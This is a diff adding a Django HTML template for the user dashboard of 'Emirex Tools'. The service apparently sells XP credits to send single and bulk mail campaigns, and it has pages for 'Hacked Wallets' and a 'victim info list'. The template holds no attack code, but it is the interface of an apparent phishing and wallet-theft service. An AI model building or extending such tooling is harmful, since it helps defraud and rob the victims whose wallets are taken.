@@ -1,0 +1,128 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Dashboard - Emirex Tools</title>
+    <link rel="stylesheet" href="{% static 'css/profile.css' %}">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" rel="stylesheet">
+    
+</head>
+<body>
+    <div class="container">
+        
+        <aside class="sidebar">
+            
+            <nav>
+                <ul>
+                    <li><a href="{% url 'core:index' %}" class="active">Dashboard</a></li>
+                    <li><a href="{% url 'core:create_campaign' %}">Send Mail</a></li>
+                    <li><a href="{% url 'account:transactions' %}">Transaction History</a></li>
+                    <li><a href="{% url 'account:deposit' %}">Buy XP</a></li>
+                    <li><a href="{% url 'core:campaign_list' %}">Mailing History</a></li>
+                <!--    <li><a href="{% url 'account:spend' %}">Transfer XP</a></li> -->
+                    <li><a href="{% url 'core:victim_info_list' %}">Hacked Wallets</a></li>
+                    <li><a href="{% url 'account:change_password' %}">Change Password</a></li>
+                    <li><a href="{% url 'account:logout' %}">Logout</a></li>
+                </ul>
+            </nav>
+        </aside>
+        <main class="content">
+            
+            <header style="margin: -20px; margin-bottom:10px;">
+                <div class="logo">
+                    <a href="#" class="logo">
+                       <i class="fas fa-cube"></i>
+                        <span>Emirex Tools</span>
+                    </a>
+                </div>
+                <button class="sidebar-toggle" id="sidebar-toggle">
+                    <i class="fas fa-bars"></i>
+                </button>
+                
+            </header>
+            <h1 style="margin: 10px; font-size:1.8em">Welcome, {{ user.username }}</h1> <!-- Welcome Message -->
+
+            <div class="dashboard-grid">
+                <div class="card balance-card">
+                    <i class="fas fa-wallet"></i>
+                    <h2>XP Balance</h2>
+                    <p class="balance">{{ user_profile.xp_balance }}</p>
+                    <a href="{% url 'account:deposit' %}" class="buy-xp">
+                        Buy XP
+                    </a>
+                </div>
+                <div class="card stat-card">
+                    <i class="fas fa-envelope"></i>
+                    <h2>Sent Mails</h2>
+                    <p class="stat">{{ campaigns_count|default:0 }}</p>
+                    <div class="mail">
+                        <a href="{% url 'core:create_campaign' %}" class="send-mail"> Send mail</a> 
+                        <a href="{% url 'core:create_multi_campaign' %}" class="send-mail"> Bulk mail</a>
+                    </div>
+                </div>
+                <div class="card stat-card">
+                    <i class="fas fa-bolt"></i>
+                    <h2>Total Deposit</h2>
+                    <p class="stat">{{ total_deposits }} XP</p>
+                    <a href="{% url 'account:transactions' %}" class="transaction-history-link"">
+                        Transaction History 
+                    </a>
+                    <a href="{% url 'core:campaign_list' %}" class="transaction-history-link">
+                        Mailing History
+                    </a>
+                </div>
+                <div class="card stat-card">
+                    <i class="fas fa-dollar-sign"></i>
+                    <h2>Total Spent</h2>
+                    <p class="stat">{{ total_spent|default:0 }} XP</p>
+                </div>
+            </div>
+
+                <!-- Button to redirect to victim info list -->
+            <a href="{% url 'core:victim_info_list' %}" class="view-info-link">
+                View Hacked Wallet <i class="fas fa-arrow-right"></i>
+            </a>
+
+        </main>
+    </div>
+    <div class="floating-button">
+        <a class="btn btn-float" href="https://chat.whatsapp.com/IwGcgf2EPMCA0P4daaKyJ6?text=Hello, I am {{ user.username}} from Emirex tools!"><i class="fas fa-paper-plane"></i> Message Us</a>
+    </div>
+    <script>
+        const menuIcon = document.getElementById('menu-icon');
+        const navLinks = document.getElementById('nav-links');
+        menuIcon.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+        });
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const toggleButton = document.getElementById('sidebar-toggle');
+            const sidebar = document.querySelector('.sidebar');
+
+            toggleButton.addEventListener('click', function() {
+                sidebar.classList.toggle('sidebar-open'); // Toggle the sidebar visibility
+            });
+
+            // Close the sidebar if it's open when clicking outside of it
+            document.addEventListener('click', function(event) {
+                if (!sidebar.contains(event.target) && !toggleButton.contains(event.target)) {
+                    sidebar.classList.remove('sidebar-open'); // Hide sidebar
+                }
+            });
+        });
+    </script>
+
+
+    <footer>
+        <div class="footer-content">
+            <p>&copy; 2024 Campaign and Account Management. All Rights Reserved.</p>
+            
+        </div>
+    </footer>
+
+</body>
+
+</html>
